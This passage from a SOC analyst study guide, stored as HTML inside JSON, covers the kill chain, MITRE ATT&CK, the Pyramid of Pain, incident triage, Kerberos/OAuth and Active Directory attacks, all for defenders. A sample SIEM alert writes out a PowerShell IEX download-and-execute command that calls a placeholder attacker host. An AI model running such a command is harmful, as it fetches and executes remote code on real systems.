seconds).<\/li>\n<li>Large outbound data transfer (exfiltration).<\/li>\n<li>Unusual destination IPs/domains.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: Network monitoring; block known C2; DNS filtering; identify beaconing patterns (SIEM correlation).<\/li>\n<\/ul>\n<h4>7. Actions on Objectives<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Attacker achieves goals.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Data exfiltration (steal files).<\/li>\n<li>Data destruction (wipe drives).<\/li>\n<li>Encryption (ransomware).<\/li>\n<li>Lateral movement (pivot to other systems).<\/li>\n<li>Privilege escalation (domain admin access).<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: DLP (data loss prevention); behavioral analysis; incident response.<\/li>\n<\/ul>\n<hr>\n<h2>MITRE ATT&amp;CK Framework<\/h2>\n<h3>What It Is<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Comprehensive knowledge base of adversary tactics, techniques, procedures (TTPs) based on real-world attacks.<\/li>\n<li><strong>URL<\/strong>: <a href=\"https://attack.mitre.org\">https://attack.mitre.org<\/a><\/li>\n<li><strong>Use<\/strong>: Organize threats, plan defenses, attribute attacks, build threat intelligence.<\/li>\n<\/ul>\n<h3>Structure<\/h3>\n<pre><code>Tactics (what is the attacker trying to achieve?)\n  └─ Techniques (how do they do it?)\n      └─ Sub-techniques (specific variations)\n<\/code><\/pre>\n<h3>14 Tactics (Simplified)<\/h3>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Tactic<\/th>\n<th align=\"left\">Goal<\/th>\n<th align=\"left\">Examples<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\"><strong>Reconnaissance<\/strong><\/td>\n<td align=\"left\">Gather info<\/td>\n<td align=\"left\">OSINT, scanning, social engineering<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Resource Development<\/strong><\/td>\n<td align=\"left\">Acquire tools<\/td>\n<td align=\"left\">Create C2 server, register domain, acquire phishing hosting<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Initial Access<\/strong><\/td>\n<td align=\"left\">Enter network<\/td>\n<td align=\"left\">Phishing, exploit public-facing app, supply chain compromise<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Execution<\/strong><\/td>\n<td align=\"left\">Run code<\/td>\n<td align=\"left\">PowerShell, script execution, macro<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Persistence<\/strong><\/td>\n<td align=\"left\">Stay in system<\/td>\n<td align=\"left\">Registry Run key, scheduled task, webshell<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Privilege Escalation<\/strong><\/td>\n<td align=\"left\">Gain higher access<\/td>\n<td align=\"left\">UAC bypass, kernel exploit, sudo misconfig<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Defense Evasion<\/strong><\/td>\n<td align=\"left\">Hide activity<\/td>\n<td align=\"left\">Obfuscation, signing malware, disabling logging<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Credential Access<\/strong><\/td>\n<td align=\"left\">Steal login info<\/td>\n<td align=\"left\">Password spray, credential dumping (Mimikatz), keylogging<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Discovery<\/strong><\/td>\n<td align=\"left\">Learn about system<\/td>\n<td align=\"left\">Network shares, process listing, software enumeration<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Lateral Movement<\/strong><\/td>\n<td align=\"left\">Move to other systems<\/td>\n<td align=\"left\">Pass-the-hash, RDP with stolen creds, exploit internal service<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Collection<\/strong><\/td>\n<td align=\"left\">Gather data<\/td>\n<td align=\"left\">Screen capture, keylogging, email forwarding<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Command &amp; Control<\/strong><\/td>\n<td align=\"left\">Remote access<\/td>\n<td align=\"left\">Beaconing, DNS tunneling, encrypted channels<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Exfiltration<\/strong><\/td>\n<td align=\"left\">Steal data<\/td>\n<td align=\"left\">Data transfer to C2, cloud upload, removable media<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Impact<\/strong><\/td>\n<td align=\"left\">Final goal<\/td>\n<td align=\"left\">Encrypt files (ransomware), delete backups, system shutdown<\/td>\n<\/tr>\n<\/tbody><\/table>\n<h3>Real-World Example: Phishing Campaign (MITRE Mapping)<\/h3>\n<p><strong>Scenario<\/strong>: Employee receives phishing email with malicious Excel file.<\/p>\n<pre><code>Tactic: Reconnaissance\n  Technique: Phishing for Information (harvest employee names from LinkedIn)\n\nTactic: Resource Development\n  Technique: Acquire Infrastructure (set up attacker.com)\n  Technique: Develop Capabilities (craft macro payload)\n\nTactic: Initial Access\n  Technique: Phishing (send malicious Excel email)\n\nTactic: Execution\n  Technique: Command and Scripting Interpreter (Excel macro runs PowerShell)\n\nTactic: Persistence\n  Technique: Registry Run Key (add malware to HKCU\\...\\Run)\n\nTactic: Defense Evasion\n  Technique: Obfuscated Files (base64-encode PowerShell command)\n\nTactic: Credential Access\n  Technique: Password Spraying (try common passwords)\n\nTactic: Lateral Movement\n  Technique: Pass-the-Hash (steal hashes, move to domain controller)\n\nTactic: Command &amp; Control\n  Technique: Application Layer Protocol (HTTP POST beacons)\n\nTactic: Exfiltration\n  Technique: Exfiltration Over C2 Channel (send stolen files to attacker server)\n\nTactic: Impact\n  Technique: Data Encrypted for Impact (ransomware encryption)\n<\/code><\/pre>\n<h3>SOC Use (TryHackMe SOC L1 Focus)<\/h3>\n<ol>\n<li><strong>Mapping Alerts<\/strong>: When you see alert, map it to tactic/technique.<ul>\n<li>Alert: &quot;PowerShell with IEX&quot; → Tactic: Execution; Technique: PowerShell scripting.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Threat Intelligence<\/strong>: IOCs/TTPs from threat intel → cross-reference MITRE.<\/li>\n<li><strong>Response Planning<\/strong>: For each technique, define detection/response.<\/li>\n<li><strong>Hunting<\/strong>: Search SIEM for techniques you know are high-risk (e.g., Pass-the-Hash).<\/li>\n<\/ol>\n<hr>\n<h2>Pyramid of Pain<\/h2>\n<h3>Concept<\/h3>\n<ul>\n<li><strong>Bottom (Easiest to Change)<\/strong>: Attacker easily changes (hashes, IPs).<\/li>\n<li><strong>Top (Hardest to Change)<\/strong>: Attacker&#39;s TTP, tools, infrastructure deeply linked to identity/operations.<\/li>\n<\/ul>\n<h3>Levels (Bottom to Top)<\/h3>\n<pre><code>       TACTICS, TECHNIQUES, PROCEDURES (TTP)\n                     ↑\n              MALWARE TOOLS\n                     ↑\n           ATTACK PATTERNS\n                     ↑\n                 DOMAINS\n                     ↑\n              IPs &amp; PORTS\n                     ↑\n           FILE HASHES (MD5)\n<\/code><\/pre>\n<h3>Details<\/h3>\n<h4>1. File Hashes (Hash Values)<\/h4>\n<ul>\n<li><strong>Effort to Change<\/strong>: Trivial (recompile, add byte of junk).<\/li>\n<li><strong>Detection Power<\/strong>: Low (changes every variant).<\/li>\n<li><strong>Use<\/strong>: Quick blocklist, not strategic.<\/li>\n<li><strong>Example<\/strong>: Block malware.exe (MD5: abc123), but attacker releases malware.exe (MD5: xyz789).<\/li>\n<\/ul>\n<h4>2. IPs &amp; Ports<\/h4>\n<ul>\n<li><strong>Effort to Change<\/strong>: Easy (use different server, rotate IPs).<\/li>\n<li><strong>Detection Power<\/strong>: Medium (narrows attack vector).<\/li>\n<li><strong>Use<\/strong>: Block IP; attacker finds new hosting.<\/li>\n<li><strong>Example<\/strong>: Block 192.168.1.100; attacker moves C2 to 10.0.0.50.<\/li>\n<\/ul>\n<h4>3. Domains<\/h4>\n<ul>\n<li><strong>Effort to Change<\/strong>: Medium (need new domain registration, DNS setup).<\/li>\n<li><strong>Detection Power<\/strong>: Medium-High (domain ties to attacker identity).<\/li>\n<li><strong>Use<\/strong>: Block domain + look for similar typos.<\/li>\n<li><strong>Example<\/strong>: Block attacker-c2.com; attacker registers attacker-c3.com (similar pattern).<\/li>\n<\/ul>\n<h4>4. Attack Patterns<\/h4>\n<ul>\n<li><strong>Effort to Change<\/strong>: Medium-High (requires relearning/retooling).<\/li>\n<li><strong>Detection Power<\/strong>: High (identifies specific attacker operations).<\/li>\n<li><strong>Use<\/strong>: Hunt for similar patterns across your environment.<\/li>\n<li><strong>Example<\/strong>: Attacker always uses PowerShell + base64 + IEX. Hunt for that pattern; catch variants.<\/li>\n<\/ul>\n<h4>5. Malware Tools<\/h4>\n<ul>\n<li><strong>Effort to Change<\/strong>: High (tools deeply integrated into operations, years to develop).<\/li>\n<li><strong>Detection Power<\/strong>: Very High (identifies attacker&#39;s toolkit).<\/li>\n<li><strong>Use<\/strong>: YARA rules for tool families; track tool evolution.<\/li>\n<li><strong>Example<\/strong>: Cobalt Strike beacon tool. Detect via beacon behavior + memory signature.<\/li>\n<\/ul>\n<h4>6. TTPs (Tactics, Techniques, Procedures)<\/h4>\n<ul>\n<li><strong>Effort to Change<\/strong>: Very High (fundamental to attacker&#39;s methodology; reflects skill, experience, training).<\/li>\n<li><strong>Detection Power<\/strong>: Highest (identifies threat actor, not just campaign).<\/li>\n<li><strong>Use<\/strong>: Attribution; long-term defense.<\/li>\n<li><strong>Example<\/strong>: APT28 favors spear-phishing + exploiting unpatched IIS. Changes tools, domains, IPs, but TTP pattern persists.<\/li>\n<\/ul>\n<h3>Implications for SOC L1<\/h3>\n<p><strong>Invest in TTP Detection<\/strong> → More sustainable than hash blocking.<\/p>\n<p><strong>Example Defense Strategy<\/strong>:<\/p>\n<pre><code>Level 1 (Reactive):\n  Block known file hashes, IPs, domains.\n  \nLevel 2 (Proactive):\n  Hunt for known attack patterns (command line, registry changes).\n  \nLevel 3 (Strategic):\n  Monitor for TTPs (spear-phishing + exploitation + lateral movement).\n  Link multiple campaigns to same threat actor.\n  Plan long-term defenses around their preferences.\n<\/code><\/pre>\n"},{"n":9,"title":"Incident Response & SOC Operations","file":"chapters/09-incident-response-soc-operations.md","covers":"IR lifecycle, alert triage, escalation, SIEM workflow","html":"<h2>Incident Response Phases (NIST)<\/h2>\n<h3>1. Preparation<\/h3>\n<ul>\n<li><strong>Goal<\/strong>: Ready defenses before incident occurs.<\/li>\n<li><strong>Activities<\/strong>:<ul>\n<li>Deploy EDR, SIEM, logging.<\/li>\n<li>Create playbooks for common incidents.<\/li>\n<li>Train SOC team.<\/li>\n<li>Establish communication channels.<\/li>\n<li>Backup critical systems.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC L1 Role<\/strong>: Understand your tools (SIEM queries, EDR capabilities).<\/li>\n<\/ul>\n<h3>2. Detection and Analysis<\/h3>\n<ul>\n<li><strong>Goal<\/strong>: Identify incident; gather initial info.<\/li>\n<li><strong>Activities<\/strong>:<ul>\n<li>Monitor alerts.<\/li>\n<li>Triage (is this real? what severity?).<\/li>\n<li>Collect logs, artifacts.<\/li>\n<li>Timeline creation.<\/li>\n<li>Hypothesis formation.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC L1 Core Activity<\/strong>: Triage, initial investigation, escalation.<\/li>\n<\/ul>\n<h3>3. Containment<\/h3>\n<ul>\n<li><strong>Goal<\/strong>: Stop spread; limit damage.<\/li>\n<li><strong>Short-term<\/strong>: Isolate affected system from network.<\/li>\n<li><strong>Long-term<\/strong>: Patch vulnerability, update firewall rules.<\/li>\n<li><strong>SOC L1 Role<\/strong>: Alert escalation team; may assist with isolation.<\/li>\n<\/ul>\n<h3>4. Eradication<\/h3>\n<ul>\n<li><strong>Goal<\/strong>: Remove attacker access; eliminate malware.<\/li>\n<li><strong>Activities<\/strong>:<ul>\n<li>Remove backdoors, malware.<\/li>\n<li>Patch vulnerabilities.<\/li>\n<li>Force password reset.<\/li>\n<li>Update firewall/network rules.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC L1 Role<\/strong>: Collect evidence; support forensics team.<\/li>\n<\/ul>\n<h3>5. Recovery<\/h3>\n<ul>\n<li><strong>Goal<\/strong>: Restore systems to normal.<\/li>\n<li><strong>Activities<\/strong>:<ul>\n<li>Restore from clean backups.<\/li>\n<li>Rebuild systems.<\/li>\n<li>Restore data.<\/li>\n<li>Validate integrity.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC L1 Role<\/strong>: Monitor for re-infection during recovery.<\/li>\n<\/ul>\n<h3>6. Post-Incident Activities<\/h3>\n<ul>\n<li><strong>Goal<\/strong>: Learn; improve.<\/li>\n<li><strong>Activities<\/strong>:<ul>\n<li>Root cause analysis.<\/li>\n<li>Document lessons learned.<\/li>\n<li>Update procedures.<\/li>\n<li>Share threat intel.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC L1 Role<\/strong>: Contribute observations; suggest improvements.<\/li>\n<\/ul>\n<hr>\n<h2>SOC Triage Workflow<\/h2>\n<h3>Step 1: Alert Received<\/h3>\n<pre><code>SIEM Alert: &quot;PowerShell with IEX Detected&quot;\n  - Alert Title\n  - Timestamp: 2024-01-15 14:32:00 UTC\n  - Severity: High\n  - Source IP: 192.168.1.100 (workstation)\n  - Event ID: 4688 (Process Creation)\n  - Command: powershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://attacker.com/payload&#39;)&quot;\n<\/code><\/pre>\n<h3>Step 2: Contextualize<\/h3>\n<pre><code>Questions to Ask:\n1. Is source IP known? Check inventory.\n   → 192.168.1.100 = John_Workstation (marketing dept).\n   \n2. Is user John expected to use PowerShell?\n   → Marketing role, typically uses email/Office. PowerShell unusual.\n   \n3. When was this activity?\n   → 2:32 PM on workday. John working hours (plausible).\n   \n4. Any related alerts on this host?\n   → 15 failed logins from 192.168.1.100 in last hour (brute force!).\n   → File created: C:\\Temp\\malware.exe.\n<\/code><\/pre>\n<h3>Step 3: Severity Assessment<\/h3>\n<pre><code>Factors:\n- Suspicious command (IEX = code execution): HIGH RISK.\n- Brute force attempt preceding activity: Indicates compromise.\n- Attacker C2 domain in command: Confirmed malicious.\n- Financial data access possible from workstation: HIGH IMPACT.\n\nSeverity: CRITICAL.\n<\/code><\/pre>\n<h3>Step 4: Initial Action<\/h3>\n<pre><code>Immediate:\n- Isolate workstation from network.\n- Block attacker C2 domain at firewall.\n- Alert user (avoid panic).\n- Notify manager.\n- Create incident ticket.\n\nInvestigation:\n- Check EDR data (process tree, network connections, file access).\n- Check logs from network appliances (firewall, proxy).\n- Identify compromised user account.\n- Search SIEM for similar activity on other hosts.\n<\/code><\/pre>\n<h3>Step 5: Escalation<\/h3>\n<pre><code>Escalate to:\n- Incident Response Team (full investigation).\n- Security Engineer (policy/rule updates).\n- Management/Legal (regulatory requirements, communication).\n- Affected Users (password reset, device cleanup).\n<\/code><\/pre>\n<hr>\n<h2>Common SOC L1 Alerts &amp; Handling<\/h2>\n<h3>1. Brute Force Login Attempts<\/h3>\n<p><strong>Alert<\/strong>: Multiple failed logins from external IP.<\/p>\n<p><strong>Triage<\/strong>:<\/p>\n<ul>\n<li>Is IP on known VPN? → Legitimate (likely user forgot password).<\/li>\n<li>Is IP from company&#39;s usual location? → Likely legitimate.<\/li>\n<li>Is account a service account? → Check if auto-retry (legitimate).<\/li>\n<li>Any successful login after failures? → Compromise suspected.<\/li>\n<\/ul>\n<p><strong>Action<\/strong>: Lock account; force password reset; notify user.<\/p>\n<h3>2. Suspicious File Created in System Directory<\/h3>\n<p><strong>Alert<\/strong>: C:\\Windows\\Temp\\malware.exe created.<\/p>\n<p><strong>Triage<\/strong>:<\/p>\n<ul>\n<li>Is process creator known? (Check parent process)<\/li>\n<li>Is file signed? (Check digital signature)<\/li>\n<li>Does file hash match known malware?<\/li>\n<li>Does file trigger EDR alert?<\/li>\n<\/ul>\n<p><strong>Action<\/strong>: Quarantine file; scan host; investigate parent process.<\/p>\n<h3>3. Unusual Outbound Network Connection<\/h3>\n<p><strong>Alert<\/strong>: Workstation connecting to 192.0.2.1:443 (high-risk IP).<\/p>\n<p><strong>Triage<\/strong>:<\/p>\n<ul>\n<li>What process initiated connection?<\/li>\n<li>Is destination IP on blocklist?<\/li>\n<li>Is destination IP hosting known malware?<\/li>\n<li>Is traffic encrypted (normal HTTPS) or abnormal protocol?<\/li>\n<\/ul>\n<p><strong>Action<\/strong>: Block destination; investigate process; check for beaconing pattern.<\/p>\n<h3>4. Large Data Transfer<\/h3>\n<p><strong>Alert<\/strong>: User downloaded 5 GB from file server to USB.<\/p>\n<p><strong>Triage<\/strong>:<\/p>\n<ul>\n<li>Is user authorized for this data? (Check job role)<\/li>\n<li>Is transfer unusual for this user? (Baseline)<\/li>\n<li>What files transferred? (Sensitive?)<\/li>\n<li>Where is USB? (User still has it?)<\/li>\n<\/ul>\n<p><strong>Action<\/strong>: Quarantine user&#39;s device; retrieve USB; investigate data leakage intent.<\/p>\n"},{"n":10,"title":"Authentication & Access Control (MFA, Kerberos, OAuth)","file":"chapters/10-authentication-access-control.md","covers":"MFA factors and attacks, Kerberos flow and attacks, OAuth 2.0","html":"<h2>MFA (Multi-Factor Authentication)<\/h2>\n<h3>Factors of Authentication<\/h3>\n<ol>\n<li><strong>Knowledge<\/strong> (something you know): Password, PIN, security question.<\/li>\n<li><strong>Possession<\/strong> (something you have): Hardware token, phone, smart card.<\/li>\n<li><strong>Inherence<\/strong> (something you are): Fingerprint, face, iris.<\/li>\n<li><strong>Location/Context<\/strong> (where/when): IP range, time window, device.<\/li>\n<\/ol>\n<h3>MFA Methods<\/h3>\n<ul>\n<li><strong>Password + SMS OTP<\/strong>: User knows password; SMS sends one-time code.<\/li>\n<li><strong>Password + Hardware Token<\/strong>: User knows password; token generates code (TOTP/HOTP).<\/li>\n<li><strong>Password + Push Notification<\/strong>: User knows password; phone app confirms login.<\/li>\n<li><strong>Biometric + Possession<\/strong>: Fingerprint + smart card.<\/li>\n<li><strong>Context-based<\/strong>: Risk score triggers additional factor.<\/li>\n<\/ul>\n<h3>Security Benefits<\/h3>\n<ul>\n<li><strong>Defense Against Phishing<\/strong>: Attacker steals password; still needs phone/token.<\/li>\n<li><strong>Defense Against Brute Force<\/strong>: Attacker can&#39;t guess OTP (time-limited).<\/li>\n<li><strong>Defense Against Credential Stuffing<\/strong>: Even if password leaked in breach, MFA blocks access.<\/li>\n<\/ul>\n<h3>Challenges &amp; Attacks<\/h3>\n<ul>\n<li><strong>SIM Swap<\/strong>: Attacker convinces carrier to transfer phone number; receives SMS codes.<ul>\n<li>Defense: Don&#39;t use SMS for sensitive accounts; use app-based OTP or hardware tokens.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Phishing MFA Codes<\/strong>: Attacker&#39;s site accepts login; prompts for MFA code; passes code to real site.<ul>\n<li>Defense: Educate users; use U2F/WebAuthn (hardware key) instead of code-based.<\/li>\n<\/ul>\n<\/li>\n<li><strong>MFA Fatigue<\/strong>: Users constantly approve notifications; attacker sends many; user approves one accidentally.<ul>\n<li>Defense: Limit approval notifications; use passwordless auth.<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<hr>\n<h2>Kerberos (Network Authentication Protocol)<\/h2>\n<h3>Background<\/h3>\n<ul>\n<li><strong>Use<\/strong>: Microsoft Active Directory (Windows domains); Linux with krb5.<\/li>\n<li><strong>Alternative<\/strong>: NTLM (older, weaker; Kerberos preferred).<\/li>\n<li><strong>Trust Model<\/strong>: Central authority (KDC) vouches for user identity.<\/li>\n<\/ul>\n<h3>Key Concepts<\/h3>\n<h4>KDC (Key Distribution Center)<\/h4>\n<ul>\n<li>Trusted server holding user/computer password hashes.<\/li>\n<li><strong>AS<\/strong> (Authentication Server): Issues TGT (proof of login).<\/li>\n<li><strong>TGS<\/strong> (Ticket Granting Server): Issues service tickets (access to resource).<\/li>\n<\/ul>\n<h4>TGT (Ticket-Granting Ticket)<\/h4>\n<ul>\n<li>Proof user authenticated to domain.<\/li>\n<li>Obtained after password entry; cached locally.<\/li>\n<li>Expires (default 10 hours).<\/li>\n<\/ul>\n<h4>Service Ticket<\/h4>\n<ul>\n<li>Proof user authorized for specific service (file share, email, etc.).<\/li>\n<li>Obtained from TGS; sent to service.<\/li>\n<li>Service validates ticket; grants access.<\/li>\n<\/ul>\n<h3>Kerberos Flow (Simplified)<\/h3>\n<pre><code>USER (john@ACME.COM)\n    ↓ [Step 1: Send username/password hash]\nKDC/AS (Authentication Server)\n    ↓ [Step 2: Verify hash; send TGT (encrypted with KDC secret)]\n    ↓\nUSER (caches TGT)\n    ↓ [Step 3: User wants to access file server; sends TGT to TGS]\nKDC/TGS (Ticket Granting Server)\n    ↓ [Step 4: Verify TGT; send service ticket (encrypted with file server secret)]\n    ↓\nFILE SERVER\n    ↓ [Step 5: User presents service ticket; server decrypts; grants access]\n    ↓\nUSER accesses files.\n<\/code><\/pre>\n<h3>Kerberos Attacks (SOC L1 Awareness)<\/h3>\n<h4>Pass-the-Ticket (PTT)<\/h4>\n<ul>\n<li><strong>Attack<\/strong>: Attacker steals TGT from one user&#39;s machine; uses it to impersonate that user.<\/li>\n<li><strong>How<\/strong>: Tools like Mimikatz extract TGT; apply to attacker&#39;s process.<\/li>\n<li><strong>Detection<\/strong>: Unusual ticket usage (different source IP).<\/li>\n<\/ul>\n<h4>Golden Ticket<\/h4>\n<ul>\n<li><strong>Attack<\/strong>: Attacker obtains KDC secret; forges TGT for any user.<\/li>\n<li><strong>Impact<\/strong>: Permanent domain access (even after password reset).<\/li>\n<li><strong>Detection<\/strong>: Very hard; requires log analysis of ticket inconsistencies.<\/li>\n<\/ul>\n<h4>Kerberoasting<\/h4>\n<ul>\n<li><strong>Attack<\/strong>: Attacker requests service ticket for service account; cracks password offline.<\/li>\n<li><strong>How<\/strong>: Service account passwords often weak (set once, forgotten).<\/li>\n<li><strong>Detection<\/strong>: Monitor for requests for unusual service tickets.<\/li>\n<\/ul>\n<h3>Defense<\/h3>\n<ul>\n<li><strong>Enforce Strong Passwords<\/strong>: Service accounts too.<\/li>\n<li><strong>Regular Audits<\/strong>: Find orphaned/unused accounts.<\/li>\n<li><strong>Monitor Ticket Usage<\/strong>: Alert on pass-the-ticket patterns.<\/li>\n<li><strong>Privilege Access Management (PAM)<\/strong>: Restrict who can access sensitive accounts.<\/li>\n<\/ul>\n<hr>\n<h2>OAuth 2.0 (Authorization, not Authentication)<\/h2>\n<h3>Purpose<\/h3>\n<ul>\n<li><strong>Use<\/strong>: Allow 3rd-party apps to access user data (without sharing password).<\/li>\n<li><strong>Example<\/strong>: Login with Google; Google authorizes app to access your calendar.<\/li>\n<\/ul>\n<h3>Flow<\/h3>\n<pre><code>USER\n  ↓ [Clicks &quot;Login with Google&quot;]\nAPP (3rd-party)\n  ↓ [Redirects user to Google]\nGOOGLE (Authorization Server)\n  ↓ [User enters Google password]\n  ↓ [User authorizes app to access calendar]\n  ↓ [Google sends authorization code back to app]\nGOOGLE → APP (authorization code)\n  ↓\nAPP [Server-side: exchanges code for access token]\nGOOGLE → APP (access token)\n  ↓\nAPP [Uses token to access user&#39;s calendar on behalf of user]\nGOOGLE (grants calendar access to app)\n  ↓\nUSER (logged in; calendar shared with app)\n<\/code><\/pre>\n<h3>Security Notes<\/h3>\n<ul>\n<li><strong>Not Authentication<\/strong>: OAuth doesn&#39;t verify user identity (doesn&#39;t replace password).<\/li>\n<li><strong>Phishing Risk<\/strong>: Attacker redirects user to fake Google login; steals OAuth code.<\/li>\n<li><strong>Token Leakage<\/strong>: If app&#39;s access token stolen, attacker accesses user&#39;s Google data.<\/li>\n<\/ul>\n"},{"n":11,"title":"Active Directory Deep-Dive","file":"chapters/11-active-directory-deep-dive.md","covers":"AD objects, NTLM vs Kerberos, pass-the-hash, privilege escalation, recon, audit events","html":"<h2>What is AD (Active Directory)?<\/h2>\n<ul>\n<li><strong>Purpose<\/strong>: Centralized directory of network resources (users, computers, groups, policies).<\/li>\n<li><strong>OS<\/strong>: Windows domain environments.<\/li>\n<li><strong>Authentication<\/strong>: Kerberos (primary) + NTLM (legacy).<\/li>\n<li><strong>Management<\/strong>: Group Policy Objects (GPOs) distribute configs.<\/li>\n<\/ul>\n<hr>\n<h2>AD Objects<\/h2>\n<h3>User Objects<\/h3>\n<ul>\n<li><strong>Attributes<\/strong>: Username, password hash, email, department, manager, group memberships.<\/li>\n<li><strong>Authentication<\/strong>: Credentials used for login.<\/li>\n<li><strong>Risks<\/strong>:<ul>\n<li>Weak password.<\/li>\n<li>Credential theft (phishing, malware).<\/li>\n<li>Privilege escalation (user to admin).<\/li>\n<li>Lateral movement (user&#39;s credentials used on other systems).<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<p><strong>SOC L1 Relevance<\/strong>: Monitor for failed logins (brute force), unusual login locations, access to sensitive resources.<\/p>\n<h3>Computer Objects<\/h3>\n<ul>\n<li><strong>Attributes<\/strong>: Computer name, OS, IP address, last login, security group memberships.<\/li>\n<li><strong>Risk<\/strong>: Unpatched systems vulnerable to malware.<\/li>\n<\/ul>\n<p><strong>SOC L1 Relevance<\/strong>: Inventory outdated systems; cross-reference with malware detections.<\/p>\n<h3>Group Objects<\/h3>\n<ul>\n<li><strong>Types<\/strong>: <strong>Security Groups<\/strong> (access control), <strong>Distribution Groups<\/strong> (email lists).<\/li>\n<li><strong>Membership<\/strong>: Define who can access resources.<\/li>\n<li><strong>Example<\/strong>: &quot;Finance_Read_Access&quot; group → users in group read financial files.<\/li>\n<\/ul>\n<p><strong>SOC L1 Relevance<\/strong>: Monitor group membership changes; detect privilege escalation via group modification.<\/p>\n<h3>OU (Organizational Unit)<\/h3>\n<ul>\n<li><strong>Purpose<\/strong>: Hierarchy of users/computers; target for GPO application.<\/li>\n<li><strong>Example Structure<\/strong>:<\/li>\n<\/ul>\n<pre><code>ACME.COM\n  └─ Finance\n  └─ Marketing\n  └─ IT\n      └─ Servers\n      └─ Workstations\n<\/code><\/pre>\n<p><strong>SOC L1 Relevance<\/strong>: Understand org structure; tailor alerts by OU.<\/p>\n<h3>GPO (Group Policy Object)<\/h3>\n<ul>\n<li><strong>Purpose<\/strong>: Centrally manage settings (security policies, software deployment, etc.).<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Enforce password length (e.g., minimum 14 characters).<\/li>\n<li>Disable USB drives.<\/li>\n<li>Deploy antivirus to all computers.<\/li>\n<li>Enforce screen lock after 5 minutes.<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<p><strong>SOC L1 Relevance<\/strong>: Know your org&#39;s policies; flag deviations (disabled AV, USB enabled unexpectedly).<\/p>\n<hr>\n<h2>AD Authentication Methods<\/h2>\n<h3>NTLM (Legacy, Weak)<\/h3>\n<ul>\n<li><strong>How<\/strong>: Challenge-response using password hash.<\/li>\n<li><strong>Weakness<\/strong>: Vulnerable to pass-the-hash attacks (attacker uses hash directly without knowing password).<\/li>\n<li><strong>SOC L1<\/strong>: NTLM authentication is &quot;Plan B&quot; when Kerberos fails; higher risk.<\/li>\n<\/ul>\n<h3>Kerberos (Standard, Preferred)<\/h3>\n<ul>\n<li><strong>How<\/strong>: Covered in Section 10 above.<\/li>\n<li><strong>Strength<\/strong>: Mutual authentication; time-limited tickets.<\/li>\n<li><strong>SOC L1<\/strong>: Monitor for Kerberos attacks (golden ticket, kerberoasting).<\/li>\n<\/ul>\n<hr>\n<h2>AD Attack Techniques (Common SOC L1 Scenarios)<\/h2>\n<h3>1. Credential Theft → Lateral Movement<\/h3>\n<p><strong>Attack Chain<\/strong>:<\/p>\n<pre><code>1. Attacker compromises User A&#39;s workstation (phishing malware).\n2. Malware runs Mimikatz → extracts User A&#39;s Kerberos TGT.\n3. Attacker uses TGT to access domain controller (Admin-equivalent access).\n4. Attacker creates new admin account: &quot;BackdoorAdmin&quot;.\n5. Attacker logs in as BackdoorAdmin; pivots to sensitive systems.\n<\/code><\/pre>\n<p><strong>Detection<\/strong> (SOC L1):<\/p>\n<ul>\n<li>Alert: Mimikatz process detected (signature).<\/li>\n<li>Alert: Unusual domain controller access from workstation IP.<\/li>\n<li>Alert: New admin account created outside change management.<\/li>\n<li>Alert: BackdoorAdmin logging in from unusual locations.<\/li>\n<\/ul>\n<p><strong>Response<\/strong>:<\/p>\n<ul>\n<li>Isolate User A&#39;s workstation.<\/li>\n<li>Force password reset (User A + admin accounts).<\/li>\n<li>Audit domain controller logs; find timeline of attacker actions.<\/li>\n<li>Delete BackdoorAdmin account; audit other accounts.<\/li>\n<\/ul>\n<h3>2. Pass-the-Hash Attack<\/h3>\n<p><strong>Attack<\/strong>:<\/p>\n<pre><code>1. Attacker steals password hash of Domain Admin from domain controller memory.\n2. Attacker doesn&#39;t crack hash; directly uses hash for authentication.\n3. Attacker accesses file servers, databases as Domain Admin.\n<\/code><\/pre>\n<p><strong>Defense<\/strong>:<\/p>\n<ul>\n<li>Use Kerberos (doesn&#39;t send password hash over network).<\/li>\n<li>Enable Windows Defender Credential Guard (protects hashes in memory).<\/li>\n<li>Monitor for unusual logon types (Kerberos vs NTLM).<\/li>\n<\/ul>\n<p><strong>Detection<\/strong>:<\/p>\n<ul>\n<li>Alert: Logon with NTLM from unexpected source (Kerberos is standard).<\/li>\n<li>Alert: Domain Admin login from workstation.<\/li>\n<\/ul>\n<h3>3. Privilege Escalation via AD Group Membership<\/h3>\n<p><strong>Attack<\/strong>:<\/p>\n<pre><code>1. Attacker compromises User A (low privilege).\n2. Attacker finds User A has modify rights on AD &quot;Finance_Admin&quot; group.\n3. Attacker adds User A to &quot;Finance_Admin&quot; group.\n4. Attacker logs in as User A; now has finance admin access.\n<\/code><\/pre>\n<p><strong>Detection<\/strong> (SOC L1):<\/p>\n<ul>\n<li>Alert: User added to high-privilege 